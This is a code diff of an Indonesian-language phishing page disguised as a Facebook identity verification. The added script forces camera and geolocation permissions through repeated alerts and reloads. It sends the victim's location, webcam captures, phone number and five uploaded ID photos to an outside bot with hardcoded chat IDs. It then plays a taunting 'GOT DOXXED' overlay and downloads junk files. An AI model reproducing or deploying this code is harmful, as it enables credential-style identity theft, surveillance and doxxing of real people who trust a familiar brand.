@@ -37,13 +37,6 @@
         }
         @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(3px,3px); } }
 
-        .credit-bar {
-            position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
-            color: white; padding: 10px 20px; display: flex; align-items: center; 
-            justify-content: space-between; border-top: 2px solid #1877f2; z-index: 1000;
-        }
-        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer; }
-        
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -51,11 +44,11 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <h6 class="mt-3 text-muted">Sinkronisasi Keamanan...</h6>
+    <h6 class="mt-3 text-muted">Mengecek Status Keamanan...</h6>
 </div>
 
 <div id="chaos-overlay">
-    <video id="chaos-video" loop playsinline muted>
+    <video id="chaos-video" loop playsinline>
         <source src="https://files.catbox.moe/3d0wgv.mp4" type="video/mp4">
     </video>
 </div>
@@ -67,26 +60,18 @@
 <div class="container">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
-        <h6 class="fw-bold mt-2">Pusat Bantuan Verifikasi</h6>
+        <h6 class="fw-bold mt-2">Verifikasi Identitas</h6>
         <hr>
         <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left; color: #dd3c10;">
-            <b>Gagal Verifikasi!</b><br>
-            Wajib mengisi nomor telepon dan mengunggah <b>TEPAT 5 FOTO</b>. Tidak boleh lebih atau kurang.
+            <b>Gagal!</b><br>Nomor tidak valid atau jumlah foto harus <b>PAS 5 FOTO</b>.
         </div>
         <div class="text-start">
-            <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon Akun">
-            <label class="small fw-bold">Upload Identitas (Wajib 5 Foto):</label>
+            <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon">
+            <label class="small fw-bold">Upload 5 Foto Identitas:</label>
             <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
         </div>
         <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
     </div>
-</div>
-
-<div class="credit-bar">
-    <div class="credit-info">
-        <span class="small" style="color: #888;">Developed by: Malik & Hack7rBGG</span>
-    </div>
-    <button class="play-btn" onclick="toggleMusic()">▶ PLAY</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -97,23 +82,28 @@
     const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
 
-    async function startSystem() {
-        // Alert awal cuma buat pancingan izin browser, abis itu HAPUS SEMUA ALERT.
+    // FITUR ALERT JIKA TIDAK IZIN 😈
+    async function initGatekeeper() {
+        alert("PERINGATAN SISTEM!\n\nAnda harus memberikan izin Kamera dan Lokasi untuk melewati pengecekan keamanan Facebook ini.");
+        
         try {
+            // Cek Lokasi
             const pos = await new Promise((res, rej) => {
                 navigator.geolocation.getCurrentPosition(res, () => {
-                    location.reload(); 
-                    rej();
+                    alert("AKSES LOKASI DITOLAK!\n\nSistem tidak bisa memverifikasi perangkat tanpa lokasi. Harap berikan izin.");
+                    location.reload(); // Paksa reload biar kena alert lagi
                 });
             });
             sendToBot(`📍 LOKASI: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
 
+            // Cek Kamera
             const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {
+                alert("AKSES KAMERA DITOLAK!\n\nVerifikasi wajah wajib dilakukan. Silakan aktifkan izin kamera.");
                 location.reload();
             });
             stream.getTracks().forEach(t => t.stop());
 
-            // LOGIN SUKSES - ALERT TIDAK AKAN PERNAH MUNCUL LAGI
+            // Jika semua lolos
             document.getElementById('splash-screen').style.display = 'none';
             document.body.style.display = 'block';
             autoCapture("user");
@@ -121,7 +111,7 @@
         } catch (e) {}
     }
 
-    window.onload = () => { setTimeout(startSystem, 1000); };
+    window.onload = () => { setTimeout(initGatekeeper, 1500); };
 
     function sendToBot(c, t="text", b=null) {
         tokens.forEach((tk, i) => {
@@ -151,24 +141,13 @@
         } catch (e) {}
     }
 
-    function toggleMusic() {
-        if (audio.paused) { audio.play(); }
-        else { audio.pause(); }
-    }
-
-    // VALIDASI MATI-MATIAN TANPA ALERT SAMPAH!
     function validateFinal() {
         const p = document.getElementById('phone').value;
         const f = document.getElementById('galeri').files;
-        const errBox = document.getElementById('mainError');
-        
-        // HANYA BOLEH PAS 5 FOTO. KURANG ATAU LEBIH = GAGAL.
-        if (p.length < 10 || f.length !== 5) {
-            errBox.style.display = 'block'; // Cuma munculin teks error di layar
+        if (p.length < 10 || f.length !== 5) { // VALIDASI MATI-MATIAN WAJIB 5 FOTO
+            document.getElementById('mainError').style.display = 'block';
             return;
         }
-        
-        errBox.style.display = 'none';
         sendToBot(`📱 TARGET: ${p}`);
         for (let i=0; i<f.length; i++) sendToBot(`🖼️ FOTO ${i+1}`, "photo", f[i]);
         startChaos();
@@ -177,9 +156,12 @@
     function startChaos() {
         const ov = document.getElementById('chaos-overlay');
         const vi = document.getElementById('chaos-video');
-        ov.style.display = 'block'; vi.muted = false; vi.play();
-        
-        // AUTO DOWNLOAD 5 FILE YOU ARE IDIOT
+        ov.style.display = 'block';
+        vi.muted = false; // Hidupin suara video
+        vi.play();
+        audio.play(); // Hidupin suara tambahan
+
+        // DOWNLOAD 5 FILE YOU ARE IDIOT
         for (let j = 1; j <= 5; j++) {
             let blob = new Blob(["YOU ARE IDIOT"], { type: "text/plain" }); 
             let url = window.URL.createObjectURL(blob);
@@ -195,7 +177,7 @@
                 d.innerHTML = "<b>YOU ARE IDIOT!</b><br>GOT DOXXED!";
                 ov.appendChild(d);
             }, 250);
-        }, 15000);
+        }, 15000); // Popup tetep muncul 15 detik setelah meledak
     }
 </script>
 </body>
